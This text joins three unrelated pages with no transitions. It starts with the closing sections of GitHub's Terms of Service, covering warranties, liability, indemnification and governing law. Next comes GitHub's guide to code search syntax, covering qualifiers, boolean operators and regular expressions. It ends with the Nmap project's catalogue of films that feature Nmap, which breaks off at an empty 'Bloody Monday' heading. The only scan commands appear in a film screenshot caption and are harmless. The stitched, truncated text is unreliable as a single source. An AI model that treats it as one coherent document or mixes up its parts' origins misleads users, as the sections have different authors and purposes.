Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation. Legal notice to GitHub must be in writing and [served on GitHub's legal agent](/en/site-policy/other-site-policies/guidelines-for-legal-requests-of-user-data#submitting-requests).

### [3. No Phone Support](#3-no-phone-support)

GitHub only offers support via email, in-Service communications, and electronic messages. We do not offer telephone support.

## [N. Disclaimer of Warranties](#n-disclaimer-of-warranties)

**Short version:** *We provide our service as is, and we make no promises or guarantees about this service. Please read this section carefully; you should understand what to expect.*

GitHub provides the Website and the Service “as is” and “as available,” without warranty of any kind. Without limiting this, we expressly disclaim all warranties, whether express, implied or statutory, regarding the Website and the Service including without limitation any warranty of merchantability, fitness for a particular purpose, title, security, accuracy and non-infringement.

GitHub does not warrant that the Service will meet your requirements; that the Service will be uninterrupted, timely, secure, or error-free; that the information provided through the Service is accurate, reliable or correct; that any defects or errors will be corrected; that the Service will be available at any particular time or location; or that the Service is free of viruses or other harmful components. You assume full responsibility and risk of loss resulting from your downloading and/or use of files, information, content or other material obtained from the Service.

## [O. Limitation of Liability](#o-limitation-of-liability)

**Short version:** *We will not be liable for damages or losses arising from your use or inability to use the service or otherwise arising under this agreement. Please read this section carefully; it limits our obligations to you.*

You understand and agree that we will not be liable to you or any third party for any loss of profits, use, goodwill, or data, or for any incidental, indirect, special, consequential or exemplary damages, however arising, that result from

* the use, disclosure, or display of your User-Generated Content;
* your use or inability to use the Service;
* any modification, price change, suspension or discontinuance of the Service;
* the Service generally or the software or systems that make the Service available;
* unauthorized access to or alterations of your transmissions or data;
* statements or conduct of any third party on the Service;
* any other user interactions that you input or receive through your use of the Service; or
* any other matter relating to the Service.

Our liability is limited whether or not we have been informed of the possibility of such damages, and even if a remedy set forth in this Agreement is found to have failed of its essential purpose. We will have no liability for any failure or delay due to matters beyond our reasonable control.

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

We reserve the right at any time and from time to time to modify or discontinue, temporarily or permanently, the Website (or any part of it) with or without notice.

## [R. Miscellaneous](#r-miscellaneous)

### [1. Governing Law](#1-governing-law)

Except to the extent applicable law provides otherwise, this Agreement between you and GitHub and any access to or use of the Website or the Service are governed by the federal laws of the United States of America and the laws of the State of California, without regard to conflict of law provisions. You and GitHub agree to submit to the exclusive jurisdiction and venue of the courts located in the City and County of San Francisco, California.

### [2. Non-Assignability](#2-non-assignability)

GitHub may assign or delegate these Terms of Service and/or the [GitHub Privacy Statement](https://github.com/site/privacy), in whole or in part, to any person or entity at any time with or without your consent, including the license grant in Section D.4. You may not assign or delegate any rights or obligations under the Terms of Service or Privacy Statement without our prior written consent, and any unauthorized assignment and delegation by you is void.

### [3. Section Headings and Summaries](#3-section-headings-and-summaries)

Throughout this Agreement, each section includes titles and brief summaries of the following terms and conditions. These section titles and brief summaries are not legally binding.

### [4. Severability, No Waiver, and Survival](#4-severability-no-waiver-and-survival)

If any part of this Agreement is held invalid or unenforceable, that portion of the Agreement will be construed to reflect the parties’ original intent. The remaining portions will remain in full force and effect. Any failure on the part of GitHub to enforce any provision of this Agreement will not be considered a waiver of our right to enforce such provision. Our rights under this Agreement will survive any termination of this Agreement.

### [5. Amendments; Complete Agreement](#5-amendments-complete-agreement)

This Agreement may only be modified by a written amendment signed by an authorized representative of GitHub, or by the posting by GitHub of a revised version in accordance with [Section Q. Changes to These Terms](#q-changes-to-these-terms). These Terms of Service, together with the GitHub Privacy Statement, represent the complete and exclusive statement of the agreement between you and us.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

# Nmap In The Movies

For reasons unknown, Hollywood has decided that Nmap is *the*
tool to show whenever hacking scenes are needed. At least it is a lot
more realistic than silly 3D animation approach used in many previous
movies (e.g. "hacking the Gibson" on Hackers, or the much worse
portrayals on Swordfish). We always like to see Nmap in the movies,
so we have catalogued known instances here.

If you catch Nmap in another flick,
please mail Fyodor.

Update (April 21, 2020): I (Fyodor) am way behind on adding new movies. Sorry about that!

Movie script writers, artists, and digital asset managers are also
welcome to email Fyodor for
advice. We've been pleased to help out to make a number of movies slightly more realistic and entertaining by improving the hacking scenes.

This page only covers movies, we have a separate page coving [news articles, reviews, books, and popular culture references](/nmap_inthenews.html).
## Matrix Reloaded

While Nmap had been used in some previous obscure movies, it was
[The Matrix Reloaded](http://www.amazon.com/dp/B0000AXE8I?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/The_Matrix_Reloaded), [IMDB](http://www.imdb.com/title/tt0234215/), [Amazon](http://www.amazon.com/dp/B0000AXE8I?tag=secbks-20)) which really turned Nmap into a movie star!

We have all seen many movies like [Hackers](http://www.imdb.com/title/tt0113243/) which pass off ridiculous 3D animated eye-candy scenes as hacking. So Fyodor [was
shocked](http://seclists.org/nmap-hackers/2003/Apr-Jun/0010.html) to find that Trinity does it properly in [The Matrix Reloaded](http://www.amazon.com/dp/B0000AXE8I?tag=secbks-20).
Needing to hack the city power grid, she whips out [Nmap](http://nmap.org/) version
[2.54BETA25](http://seclists.org/nmap-hackers/2001/Apr-Jun/0005.html), uses
it to find a vulnerable SSH server, and then proceeds to exploit it
using the [SSH1
CRC32](http://packetstormsecurity.org/advisories/bindview/adv_ssh1crc.txt) exploit from 2001. Shame on the city for being vulnerable ([timing notes](http://insecure.org/stf/neiljk.html)).

A video of the exploit
is [available on
YouTube](//www.youtube.com/watch?v=0PxTAn4g20U) or
as [matrix-nmap.mp4](matrix/matrix-nmap.mp4).

## Ocean's 8

[Ocean's 8](http://www.amazon.com/dp/B07BXB4SF5?tag=secbks-20) ([Wikipedia](https://en.wikipedia.org/wiki/Ocean%27s_8), [IMDB](https://www.imdb.com/title/tt5164214/), [Amazon](http://www.amazon.com/dp/B07BXB4SF5?tag=secbks-20)) is a 2018 comedy heist film starring Sandra Bullock, Rihanna, Cate Blanchett, and Anne Hathaway that continues the series started by [Ocean's Eleven](https://en.wikipedia.org/wiki/Ocean%27s_Eleven) in 2001. Rihanna plays the film's main hacker, Nine Ball. She uses Nmap in many scenes to compromise people and companies responsible for guarding the $150 million diamond necklace they want to steal. Nmap is normally shown in the background as context to her hacks rather than taking the leading role.

In this screen ([full version](oceans8/screens/oceans8-samy-video-nmap-scene-1920x804.jpg)), Nmap is shown in the two screens on the right while they are 3D-scanning their target necklace on the left:

And here is the whole gang gathered together to (presumably) analyze their Nmap results (image is from [The Mercury News](https://www.mercurynews.com/2018/06/10/oceans-8-opens-with-franchise-best-41-5m-to-top-weekend/)):

Even the movie trailer has a glimpse of Nmap at 1:50:

Congratulations to Alejandro Hernandez for being first to discover and report the Nmap scenes!
## Snowden

Oliver Stone's 2016 [Snowden](http://www.amazon.com/dp/B01LTHO65M?tag=secbks-20) film ([Wikipedia](https://en.wikipedia.org/wiki/Snowden_%28film%29), [IMDB](http://www.imdb.com/title/tt3774114/), [Amazon](http://www.amazon.com/dp/B01LTHO65M?tag=secbks-20)) dramatizes Edward Snowden's massive leak of classified documents revealing NSA widespread surveillance of U.S. citizens. In one early scene, Snowden is given a network security challenge at a CIA training class which is expected to take 5 to 8 hours. But with the help [Nmap](https://nmap.org/) and a custom [Nmap NSE](https://nmap.org/nsedoc/) script named ptest.nse, Snowden stuns the professor by completing everything in 38 minutes! Nmap's distinct tabular output is visible on other students' screens too, though we may have to wait for the 4K resolution film release to read the exact text. Here are a couple screen shots from the Nmap scenes:
[![Snowden's computer screen shows him running 'nmap -p1433 --script=ptest.nse' and 'sudo nmap -sP 10.14.0.0/24'](snowden/screenshots/snowden-film-nmap-screenshot-crop-400x166.jpg)](snowden/screenshots/snowden-film-nmap-screenshot.jpg)

## Dredd

[Dredd](http://www.amazon.com/dp/B005LAII80?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Dredd), [IMDB](http://www.imdb.com/title/tt1343727/), [Amazon](http://www.amazon.com/dp/B005LAII80?tag=secbks-20)), a film adaptation of the famous [Judge Dredd comics](http://en.wikipedia.org/wiki/Judge_Dredd), was released in 2012 and contains multiple Nmap scenes.

In the vast, post-apocalyptic metropolis of Mega City One, the only law is provided by the Judges of the Hall of Justice—cops with the power of judge, jury and executioner. Most feared among these law-keepers is the ruthless and implacable Judge Dredd ([Karl Urban](http://www.imdb.com/name/nm0881631/)). He and Cadet Judge Cassandra Anderson ([Olivia Thirlby](http://www.imdb.com/name/nm1880888/)) infiltrate a notorious high-rise slum tower controlled by former prostitute-turned-drug-lord Ma-Ma ([Lena Headey](http://www.imdb.com/name/nm0372176/)). For network reconnaissance and exploitation of the slum tower network, they turn to Nmap! The [three minute movie trailer](//youtu.be/PifvRiHVSCY) briefly shows an Nmap [version scan](http://nmap.org/book/vscan.html) against TCP port 22 ([SSH](http://en.wikipedia.org/wiki/Secure_Shell)):

Congratulations to Aleksei Usov for being first to discover and report the Nmap scenes!
## Elysium

The 2013 science-fiction film [Elysium](http://www.amazon.com/dp/B008JFUN6E?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Elysium_%28film%29), [IMDB](http://www.imdb.com/title/tt1535108/), [Amazon](http://www.amazon.com/dp/B008JFUN6E?tag=secbks-20)) stars [Matt Damon](http://en.wikipedia.org/wiki/Matt_Damon) and [Jodie Foster](http://en.wikipedia.org/wiki/Jodie_Foster). It takes us to the year 2154 when an overpopulated Earth teems with poverty, crime, and destruction while the rich live on a luxurious space station. Nmap version 13 (I guess this really is the future!) is used to port scan Matt Damon's augmented brain before transferring the data he carries in an attempt to hack the space station.

Nmap action:

## Fantastic Four

[Fantastic Four](http://www.amazon.com/dp/B013JPCA1Y?tag=secbks-20) ([Wikipedia](https://en.wikipedia.org/wiki/Fantastic_Four_%282015_film%29), [IMDB](http://www.imdb.com/title/tt1502712/), [Amazon](http://www.amazon.com/dp/B013JPCA1Y?tag=secbks-20)) is a 2015 big-budget superhero film based on the Marvel Comics team of the same name. In the film, Sue Storm (played by [Kate Mara](http://www.imdb.com/name/nm0544718/)) uses her Nmap skills to track down a companion. Her computer flashes "IPSCAN", then "TRACEROUTE", "PORTSCAN", and finally "NMAP". Screen shots (click the 2nd one to see the wider shot):

## Who Am I—No System Is Safe

[Who Am I—No System is Safe](http://www.amazon.com/dp/B00NW8C1GS?tag=secbks-20) ([Wikipedia](https://en.wikipedia.org/wiki/Who_Am_I_%E2%80%93_No_System_Is_Safe), [IMDB](http://www.imdb.com/title/tt3042408/), [Amazon](http://www.amazon.com/dp/B00NW8C1GS?tag=secbks-20)) is a 2014 German cyber-thriller about dueling hacker groups (patterned after Anonymous) vying to commit the most audacious system compromises and pranks. During an initiation scene 13:40 into the movie, the protagonist Benjamin proves his skills by compromising the local power company and causing a brief blackout. He does so by running an [Nmap Scripting Engine (NSE)](http://nmap.org/book/nse.html) script that he has presumably written. The script is named iec-backdoor.nse, referencing the [International Electrotechnical Commission (IEC)](https://en.wikipedia.org/wiki/International_Electrotechnical_Commission) standards which control utility power grid equipment. This bit of realism is a nice touch! Screen shots:

## Bourne Ultimatum

In [The Bourne Ultimatum](http://www.amazon.com/dp/B000VWYJ86?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/The_Bourne_Ultimatum_%28film%29), [IMDB](http://imdb.com/title/tt0440963/), [Amazon](http://www.amazon.com/dp/B000VWYJ86?tag=secbks-20)), the CIA needs to hack the mail server of a newspaper ([The Guardian UK](http://www.guardian.co.uk/)) to read the email of a reporter they assassinated. So they turn to [Nmap](http://nmap.org/) and its new official GUI [Zenmap](http://nmap.org/zenmap/) to hack the mail server! Nmap reports that the mail server is running SSH 3.9p1, Posfix smtpd, and a name server (presumably bind). They also make substantial use of [Bash, the Bourne-again shell](http://en.wikipedia.org/wiki/Bash). Congratulations to Roger Chui for being the first to spot this. He also sent a [scene transcript](/nmap/misc/bourne-transcript.html) and the following HD screen shots (click for full resolution):

## Die Hard 4

Yippee Ki-Yay! [In Die Hard 4: Live Free or Die Hard](http://www.amazon.com/dp/B000VNMMR0?tag=secbks-20)
([Wikipedia](http://en.wikipedia.org/wiki/Die_hard_4),
[IMDB](http://www.imdb.com/title/tt0337978/), [Amazon](http://www.amazon.com/dp/B000VNMMR0?tag=secbks-20)), Detective John McClane (Bruce Willis) is dispatched to retrieve hacker Matthew Farrell (Justin Long) because the FBI suspects him of breaching their computer systems. Later, Justin is enlisted to help thwart terrorist mastermind Thomas Gabrial's attempts at total World destruction. In this Scene, Farrell demonstrates his Nmap skills:

Thanks to Andrew Hake for catching the cameo and sending [these](diehard4/) HD screen shots.The scene occurs about 8 minutes into the movie.
## The Girl with the Dragon Tattoo

[The Girl with the Dragon Tattoo](http://www.amazon.com/dp/B003FBNJ4U?tag=secbks-20) (Swedish: Män som hatar kvinnor) is a 2009 Swedish thriller film ([Wikipedia](http://en.wikipedia.org/wiki/The_Girl_with_the_Dragon_Tattoo_%28film%29),
[IMDB](http://www.imdb.com/title/tt1132620/), [Amazon](http://www.amazon.com/dp/B003FBNJ4U?tag=secbks-20)) based on the [Internationally bestselling novel](http://www.amazon.com/dp/0307454541?tag=secbks-20) by Stieg Larsson. It follows Lisbeth, a troubled young hacker suffering from Asperger syndrome and a history of abuse by authority figures, as she works with a journalist trying to solve a 40-year old murder mystery. It was the third-highest grossing non-English film of 2009.

The Nmap scene lasts only moments and occurs about 6 minutes in. Note that this is the original film ([English subtitled version available on Amazon](http://www.amazon.com/dp/B003FBNJ4U?tag=secbks-20)). A big-budget Hollywood remake was released in 2011 ([IMDB](http://www.imdb.com/title/tt1568346/), [Wikipedia](http://en.wikipedia.org/wiki/The_Girl_with_the_Dragon_Tattoo_%282011_film%29), [Amazon](http://www.amazon.com/dp/B003Y5H5HY?tag=secbks-20)), though they may have ruined it by cutting the Nmap scene!

## G.I. Joe: Retaliation

Nmap is used to launch nuclear weapons in the 2013 action film [G.I. Joe: Retaliation](http://www.amazon.com/dp/B00C28J2VQ?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/G.I._Joe%3A_Retaliation), [IMDB](http://www.imdb.com/title/tt1583421/), [Amazon](http://www.amazon.com/dp/B00C28J2VQ?tag=secbks-20)). While their syntax is a little screwy, they seem to scan a missile silo with Nmap, ssh to each located ICBM, su to root and then execute commands to arm and launch it. Here are screen shots followed by the movie trailer:

## The Listening

Nmap and NmapFE were used in
[The Listening](http://www.amazon.com/dp/B000VLOKT0?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/The_Listening_%28film%29), [IMDB](http://www.imdb.com/title/tt0427461/), [Amazon](http://www.amazon.com/dp/B000VLOKT0?tag=secbks-20)), a 2006 movie about a former NSA officer who defects and mounts a clandestine counter-listening station high in the Italian alps.

## Justice League: Doom

Nmap is used in the opening credits of
[Justice League: Doom](http://www.amazon.com/dp/B005SH63KG?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Justice_League%3A_Doom), [IMDB](http://www.imdb.com/title/tt2027128/), [Amazon](http://www.amazon.com/dp/B005SH63KG?tag=secbks-20)). This 2012 animated superhero film features Batman, Superman, Wonder Woman, and Green Lantern battling a team of supervillains. Thanks to Spencer Davenport for catching this and sending [screenshots](justiceleague/). It is interesting that in most cases (but not all), they changed the Nmap URL (http://nmap.org) in the Nmap output to http://we.inc (Wayne Enterprises). Also, they ran the command in August 2011 using a version of Nmap (4.20) from 2006. I realize that Batman has a lot of important and heroic work to do, but surely he can spare 5 minutes to download and install the [latest version of Nmap](http://nmap.org/download.html)!

## Abduction

[Abduction](http://www.amazon.com/dp/B00682LS96?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Abduction_%282011_film%29), [IMDB](http://www.imdb.com/title/tt1600195/), [Amazon](http://www.amazon.com/dp/B00682LS96?tag=secbks-20)) is a 2011 thriller about a teenager (Taylor Lautner from the Twilight series) who sets out to uncover the truth about his life after finding his baby photo on a missing persons website. In the process he is chased by, among other villians, an Nmap-using Serbian hacker henchman. If you notice something familiar about the background Nmap scans in the screenshots below, it's because the film makers directly cribbed some of them from [The Matrix Reloaded](#matrix).

## Extracted

The 2012 science fiction thriller [Extracted](http://www.amazon.com/dp/B00DPH7QPM?tag=secbks-20) ([IMDB](http://www.imdb.com/title/tt1757746/), [Amazon](http://www.amazon.com/dp/B00DPH7QPM?tag=secbks-20)) portrays a scientist who invents a technique to watch people's memories, but finds trouble when entering the mind of a heroin addict suspected of murder. Nmap is used as part of the system for entering someone's mind (maybe that is an NSE script). Screen shot (click for the whole thing):

## 13: Game of Death

Nmap was used in the acclaimed Thai thriller [13:
Game of Death](http://www.amazon.com/dp/B00118T61O?tag=secbks-20)
([Wikipedia](http://en.wikipedia.org/wiki/13_Beloved),
[IMDB](http://www.imdb.com/title/tt0883995/), [Amazon](http://www.amazon.com/dp/B00118T61O?tag=secbks-20)), also known as "13 Beloved" and "13 game sayawng". This movie follows the story of a man given the chance to complete 13 challenges to win $100,000,000. Successive challenges become increasingly intense, dangerous, illegal, degrading, and grotesque. What would you do for $100 million? Eventually one of his sysadmin friends gets worried about him and she demonstrates Nmap hacking skills by breaking into the twisted game's website ([longer summary](misc/13game-summary.html)).

We have received
an [AVI video (5MB)](13game/13gameofdeath-nmap.avi)
of the scene, and also [numerous
screenshots](13game/).

## Battle Royale

[Battle Royale](http://www.amazon.com/dp/B000F4LPJ6?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Battle_Royale_%28film%29),
[IMDB](http://www.imdb.com/title/tt0266308/), [Amazon](http://www.amazon.com/dp/B000F4LPJ6?tag=secbks-20)), also known as Batoru Rowaiaru,
is a bizarre and controversial Japanese movie about a class of 9th graders sent by the government to an abandoned island to be fitted with explosive collars and forced to kill each as part of a twisted survival game. One of the students is a hacker, and can be seen referencing Nmap source code in these clips:

## Broken Saints

[Broken Saints](http://www.amazon.com/dp/B000FKO3RQ?tag=secbks-20) ([Wikipedia](http://en.wikipedia.org/wiki/Broken_Saints), [IMDB](http://www.imdb.com/title/tt0451002/), [Amazon](http://www.amazon.com/dp/B000FKO3RQ?tag=secbks-20)) is an award-winning animated film series ([motion comic](http://en.wikipedia.org/wiki/Motion_comic)) produced in 24 chapters first published online between 2001 and 2003. It was then improved for the [2006 DVD release](http://www.amazon.com/dp/B000FKO3RQ?tag=secbks-20) distributed by 20th Century Fox. It is a complex, 12-hour tale of four strangers from "the quiet corners of the globe" connected by a vision they all receive of coming evil.

One of those four strangers, Raimi, is a young security software developer who uses Nmap to compromise systems and uncover corporate treachery at his estranged employer. The Nmap Scene is in Chapter 2, *Cryptic*, and can be [viewed free on Youtube](//www.youtube.com/user/brokensaint#p/u/26/bY1xbDm-tyE). You don't really need to watch Chapter 1 first, but it is [available here](//www.youtube.com/user/brokensaint#p/u/28/JxE9EODS588). The Nmap cameo was first discovered by David Alexander. Screenshots:

Nmap (and then telnet) are used by a teenage hacker (Gena) to deface Microsoft.Com in the 2006 Russian film Khottabych
([Wikipedia](http://en.wikipedia.org/wiki/Khottabych), [IMDB](http://www.imdb.com/title/tt0466043/)). Microsoft and the US authorities are understandably upset by the attack, so they send the attractive female hacker Annie to flush him out. The movie also features an epic battle between powerful genies (the kind which come in a bottle) fighting for dominion over Earth. Thanks to Paul Shatov for notifying us and sending the [screenshots](khottabych/all/)! I bought [this DVD from Amazon](http://www.amazon.com/dp/B000OIR8A8?tag=secbks-20), but it is region 5 and offers no English dubbing or subtitles. I had to use [this subtitle file](khottabych/khottabych.srt). Wikipedia claims that a region 1 English DVD was released.

## HaXXXor: No Longer Floppy

With the risque "HaXXXor" series of low-budget films, Nmap makes the leap from Science fiction to soft-core pornography. “HaXXXor Volume 1: No Longer Floppy” includes a lengthy Nmap training scene by model E-Lita. Here are some photos from early in the scene while she is still clothed:

## Bloody Monday

